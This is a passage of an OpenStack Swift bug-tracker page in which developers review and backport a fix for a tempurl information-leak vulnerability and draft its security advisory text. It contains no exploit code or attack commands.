<p>b) trying to use this vulnerability as a make shift temporary-<wbr />large-object-<wbr />upload feature and should be told explicitly that we have broken this workflow because it was not safe and they will need to force us to implement some support for this use case (probably via for tempurl signatures in slo&#x27;s FWIW).</p>
<p>I retested Kota&#x27;s patch and I think the only thing that is missing is the Co-Author line ;)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">@Kota I want the explicit error because if someone is trying to make a dlo via tempurl they are either 

a) trying to validate this security hole and they will know they are patched/hozed by the 400

b) trying to use this vulnerability as a make shift temporary-large-object-upload feature and should be told explicitly that we have broken this workflow because it was not safe and they will need to force us to implement some support for this use case (probably via for tempurl signatures in slo's FWIW).

I retested Kota's patch and I think the only thing that is missing is the Co-Author line ;)
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/swift/+bug/1453948/comments/13" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tsuyuzaki-kota" class="sprite person">Kota Tsuyuzaki (tsuyuzaki-kota)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-07-24T06:27:53.735887+00:00" title="2015-07-24 06:27:53 UTC">on 2015-07-24</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/swift/+bug/1453948/comments/13"> #13</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>@Clay That totally makes me sense and I agreed we should show the error explicitly. And thanks for adding me to the co-author line :)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">@Clay That totally makes me sense and I agreed we should show the error explicitly. And thanks for adding me to the co-author line :)</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/swift/+bug/1453948/comments/14" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~notmyname" class="sprite person">John Dickinson (notmyname)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-07-27T04:16:04.659564+00:00" title="2015-07-27 04:16:04 UTC">on 2015-07-27</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/swift/+bug/1453948/comments/14"> #14</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>@Clay, the patch in #12 looks good.</p>
<p>Consider this my +2, which gives us 2 (from Kota&#x27;s in #13).</p>
<p>We&#x27;ll need to get backports here, and it looks like we don&#x27;t have a CVE description yet. I&#x27;m not sure what the next step is there.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">@Clay, the patch in #12 looks good.

Consider this my +2, which gives us 2 (from Kota's in #13).


We'll need to get backports here, and it looks like we don't have a CVE description yet. I'm not sure what the next step is there.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>description</b>:
      </td>
      <td>
        updated
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/swift/+bug/1453948/comments/15" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~notmyname" class="sprite person">John Dickinson (notmyname)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-07-29T07:52:15.057096+00:00" title="2015-07-29 07:52:15 UTC">on 2015-07-29</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/swift/+bug/1453948/comments/15"> #15</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/swift/+bug/1453948/+attachment/4435635/+files/tempurl.patch">tempurl.patch</a>
        <a class="sprite edit action-icon" href="/swift/+bug/1453948/+attachment/4435635">Edit</a>
        (7.6 KiB,
        text/plain)
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>attached is the exact same patch (including commit message, date, and author) except formatted with `git format-patch` so that `git am &lt;file.patch` will apply it cleanly.</p>
<p>I am working on backport patches for juno and kilo, but I still have a few unit test errors there.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">attached is the exact same patch (including commit message, date, and author) except formatted with `git format-patch` so that `git am &lt;file.patch` will apply it cleanly.

I am working on backport patches for juno and kilo, but I still have a few unit test errors there.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/swift/+bug/1453948/comments/16" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~notmyname" class="sprite person">John Dickinson (notmyname)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-07-29T17:29:14.240305+00:00" title="2015-07-29 17:29:14 UTC">on 2015-07-29</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/swift/+bug/1453948/comments/16"> #16</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/swift/+bug/1453948/+attachment/4435840/+files/juno-tempurl-bp.patch">juno-tempurl-bp.patch</a>
        <a class="sprite edit action-icon" href="/swift/+bug/1453948/+attachment/4435840">Edit</a>
        (7.6 KiB,
        text/plain)
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>backport for juno. This is based off of the proposed juno backport in <a rel="nofollow" href="https://review.openstack.org/#/q/Id179513c6010d827cbcbdda7692a920e29213bcb,n,z">https:/<wbr />/review.<wbr />openstack.<wbr />org/#/q/<wbr />Id179513c6010d8<wbr />27cbcbdda7692a9<wbr />20e29213bcb,<wbr />n,z</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">backport for juno. This is based off of the proposed juno backport in https://review.openstack.org/#/q/Id179513c6010d827cbcbdda7692a920e29213bcb,n,z

</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/swift/+bug/1453948/comments/17" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~notmyname" class="sprite person">John Dickinson (notmyname)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-07-29T17:29:47.058865+00:00" title="2015-07-29 17:29:47 UTC">on 2015-07-29</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/swift/+bug/1453948/comments/17"> #17</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/swift/+bug/1453948/+attachment/4435842/+files/kilo-tempurl-bp.patch">kilo-tempurl-bp.patch</a>
        <a class="sprite edit action-icon" href="/swift/+bug/1453948/+attachment/4435842">Edit</a>
        (7.6 KiB,
        text/plain)
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>backport for kilo. This is based off of the proposed juno backport in <a rel="nofollow" href="https://review.openstack.org/#/q/Id179513c6010d827cbcbdda7692a920e29213bcb,n,z">https:/<wbr />/review.<wbr />openstack.<wbr />org/#/q/<wbr />Id179513c6010d8<wbr />27cbcbdda7692a9<wbr />20e29213bcb,<wbr />n,z</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">backport for kilo. This is based off of the proposed juno backport in https://review.openstack.org/#/q/Id179513c6010d827cbcbdda7692a920e29213bcb,n,z

</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in swift: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>importance</b>:
      </td>
      <td>
        Undecided &#8594; Critical
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/swift/+bug/1453948/comments/18" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tristan-cacqueray" class="sprite person">Tristan Cacqueray (tristan-cacqueray)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-08-04T21:26:17.288445+00:00" title="2015-08-04 21:26:17 UTC">on 2015-08-04</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/swift/+bug/1453948/comments/18"> #18</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>@notmyname, would it makes sense to solve both <a href="/bugs/1453948" class="bug-link">bug 1453948</a> and <a href="/bugs/1449212" class="bug-link">bug 1449212</a> with a single OSSA/CVE ? If so, would that updated impact description good enough to cover both cases ?</p>
<p>Title: Information leak via Swift tempurls<br />
Reporter: Richard Hawkins (Rackspace)<br />
Products: Swift<br />
Affects: versions through 2.2.0, and 2.2.1 versions through 2.3.0</p>
<p>Description:<br />
Richard Hawkins from Rackspace reported a vulnerability in Swift tempurls. When in possession of a tempurl key for a Swift container, a malicious actor may retrieve objects within any other containers for the same Swift account (tenant). All Swift setup are affected.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">@notmyname, would it makes sense to solve both bug 1453948 and bug 1449212 with a single OSSA/CVE ? If so, would that updated impact description good enough to cover both cases ?

Title: Information leak via Swift tempurls
Reporter: Richard Hawkins (Rackspace)
Products: Swift
Affects: versions through 2.2.0, and 2.2.1 versions through 2.3.0

Description:
Richard Hawkins from Rackspace reported a vulnerability in Swift tempurls. When in possession of a tempurl key for a Swift container, a malicious actor may retrieve objects within any other containers for the same Swift account (tenant). All Swift setup are affected.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/swift/+bug/1453948/comments/19" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~alistair-coles" class="sprite person">Alistair Coles (alistair-coles)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-08-05T11:06:15.125360+00:00" title="2015-08-05 11:06:15 UTC">on 2015-08-05</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/swift/+bug/1453948/comments/19"> #19</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite download-icon" href="https://bugs.launchpad.net/swift/+bug/1453948/+attachment/4439702/+files/anc-tempurl-dlo-POST-regression">anc-tempurl-dlo-POST-regression</a>
        <a class="sprite edit action-icon" href="/swift/+bug/1453948/+attachment/4439702">Edit</a>
        (3.2 KiB,
        text/plain)
      </li>
    </ul>

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I&#x27;m +2 for the patch in #15</p>
<p>The tests do not cover POST requests. The fix does so there is no vulnerability with a POST but I think it would be worth adding a test to prevent a regression of the kind illustrated in the attached diff (diff wrt patch from #15). I can propose that to master after this fix is released.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I'm +2 for the patch in #15

The tests do not cover POST requests. The fix does so there is no vulnerability with a POST but I think it would be worth adding a test to prevent a regression of the kind illustrated in the attached diff (diff wrt patch from #15). I can propose that to master after this fix is released.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/swift/+bug/1453948/comments/20" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~alistair-coles" class="sprite person">Alistair Coles (alistair-coles)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-08-05T11:14:36.706899+00:00" title="2015-08-05 11:14:36 UTC">on 2015-08-05</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/swift/+bug/1453948/comments/20"> #20</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite download-icon" href="https://bugs.launchpad.net/swift/+bug/1453948/+attachment/4439705/+files/anc-tempurl-dlo-POST-test">anc-tempurl-dlo-POST-test</a>
        <a class="sprite edit action-icon" href="/swift/+bug/1453948/+attachment/4439705">Edit</a>
        (4.1 KiB,
        text/plain)
      </li>
    </ul>

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>FWIW Here&#x27;s a suggested diff wrt patch at #15 for extra test coverage of POSTs. But I repeat I am +2 for merging patch at #15 as it is and following up with the extra tests.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">FWIW Here's a suggested diff wrt patch at #15 for extra test coverage of POSTs. But I repeat I am +2 for merging patch at #15 as it is and following up with the extra tests.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/swift/+bug/1453948/comments/21" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~notmyname" class="sprite person">John Dickinson (notmyname)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-08-10T19:52:54.448814+00:00" title="2015-08-10 19:52:54 UTC">on 2015-08-10</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/swift/+bug/1453948/comments/21"> #21</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Updated report description:</p>
<p>Title: Information leak via Swift tempurls<br />
Reporter: Richard Hawkins and Swift core reviewers<br />
Products: Swift<br />
Affects: versions through 2.3.0</p>
<p>Description:<br />
Richard Hawkins and Swift core reviewers reported a vulnerability in Swift tempurls. When in possession of a tempurl key authorized for PUT, a malicious actor may retrieve other objects in the same Swift account (tenant). All Swift setup are affected.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Updated report description:


Title: Information leak via Swift tempurls
Reporter: Richard Hawkins and Swift core reviewers
Products: Swift
Affects: versions through 2.3.0

Description:
Richard Hawkins and Swift core reviewers reported a vulnerability in Swift tempurls. When in possession of a tempurl key authorized for PUT, a malicious actor may retrieve other objects in the same Swift account (tenant). All Swift setup are affected.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/swift/+bug/1453948/comments/22" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tristan-cacqueray" class="sprite person">Tristan Cacqueray (tristan-cacqueray)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-08-17T14:49:00.832566+00:00" title="2015-08-17 14:49:00 UTC">on 2015-08-17</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/swift/+bug/1453948/comments/22"> #22</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Thanks John.</p>
<p>Adding affiliation back to description:</p>
<p>Title: Information leak via Swift tempurls<br />
Reporter: Richard Hawkins (Rackspace) and Swift core reviewers<br />
Products: Swift<br />
Affects: versions through 2.3.0</p>
<p>Description:<br />
Richard Hawkins from Rackspace and Swift core reviewers reported a vulnerability in Swift tempurls. When in possession of a tempurl key authorized for PUT, a malicious actor may retrieve other objects in the same Swift account (tenant). All Swift setup are affected.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Thanks John.

Adding affiliation back to description:

Title: Information leak via Swift tempurls
Reporter: Richard Hawkins (Rackspace) and Swift core reviewers
Products: Swift
Affects: versions through 2.3.0

Description:
Richard Hawkins from Rackspace and Swift core reviewers reported a vulnerability in Swift tempurls. When in possession of a tempurl key authorized for PUT, a malicious actor may retrieve other objects in the same Swift account (tenant). All Swift setup are affected.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in ossa: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Incomplete &#8594; Triaged
      </td>
    </tr>
    <tr>
      <td style="text-align: right;">
        <b>assignee</b>:
      </td>
      <td>
        nobody &#8594; Tristan Cacqueray (tristan-cacqueray)
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/swift/+bug/1453948/comments/23" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tristan-cacqueray" class="sprite person">Tristan Cacqueray (tristan-cacqueray)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-08-19T18:27:55.013572+00:00" title="2015-08-19 18:27:55 UTC">on 2015-08-19</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/swift/+bug/1453948/comments/23"> #23</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>As for the required patchs to fix the bug describe above:</p>
<p>master/liberty: <a href="/bugs/1453948" class="bug-link">bug 1453948</a> comment #15, <a href="/bugs/1449212" class="bug-link">bug 1449212</a> comment #85<br />
stable/kilo:    <a href="/bugs/1453948" class="bug-link">bug 1453948</a> comment #17, <a href="/bugs/1449212" class="bug-link">bug 1449212</a> comment #90<br />
stable/juno:    <a href="/bugs/1453948" class="bug-link">bug 1453948</a> comment #16</p>
<p>Seems like all the patch have now been pre-approved. Should we requests a CVE with description in comment #22 and set this disclosure date:<br />
2015-08-25, 1500UTC</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">As for the required patchs to fix the bug describe above:

master/liberty: bug 1453948 comment #15, bug 1449212 comment #85
stable/kilo:    bug 1453948 comment #17, bug 1449212 comment #90
stable/juno:    bug 1453948 comment #16

Seems like all the patch have now been pre-approved. Should we requests a CVE with description in comment #22 and set this disclosure date:
2015-08-25, 1500UTC

</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/swift/+bug/1453948/comments/24" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~fungi" class="sprite person">Jeremy Stanley (fungi)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-08-19T19:01:06.399485+00:00" title="2015-08-19 19:01:06 UTC">on 2015-08-19</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/swift/+bug/1453948/comments/24"> #24</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
